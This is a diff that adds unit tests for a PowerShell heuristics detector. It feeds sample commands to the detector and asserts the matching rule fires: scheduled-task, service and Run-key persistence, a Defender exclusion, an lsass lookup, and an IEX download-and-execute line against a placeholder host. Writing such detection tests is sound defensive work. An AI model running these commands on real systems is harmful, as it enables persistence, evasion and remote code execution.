@@ -48,4 +48,23 @@ public class PsHeuristicsTests
         // "-e bypass" is not -ExecutionPolicy; it must not trip ps.exec-bypass.
         Assert.DoesNotContain(PsHeuristics.Evaluate("powershell -e bypass"), h => h.Rule == "ps.exec-bypass");
     }
+
+    [Theory]
+    [InlineData("Register-ScheduledTask -TaskName Demo", "ps.persistence-task")]
+    [InlineData("New-Service -Name Demo -BinaryPathName C:\\Demo.exe", "ps.persistence-service")]
+    [InlineData("Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name Demo", "ps.persistence-autorun")]
+    [InlineData("Add-MpPreference -ExclusionPath C:\\Temp", "ps.security-exclusion")]
+    [InlineData("Get-Process lsass", "ps.credential-access")]
+    public void Flags_AdditionalDefenderRelevantBehavior(string script, string rule)
+    {
+        Assert.Contains(PsHeuristics.Evaluate(script), hit => hit.Rule == rule);
+    }
+
+    [Fact]
+    public void Flags_DownloadAndExecuteCombination()
+    {
+        var hits = PsHeuristics.Evaluate("IEX (Invoke-WebRequest https://example.invalid/a).Content");
+
+        Assert.Contains(hits, hit => hit.Rule == "ps.download-execute");
+    }
 }
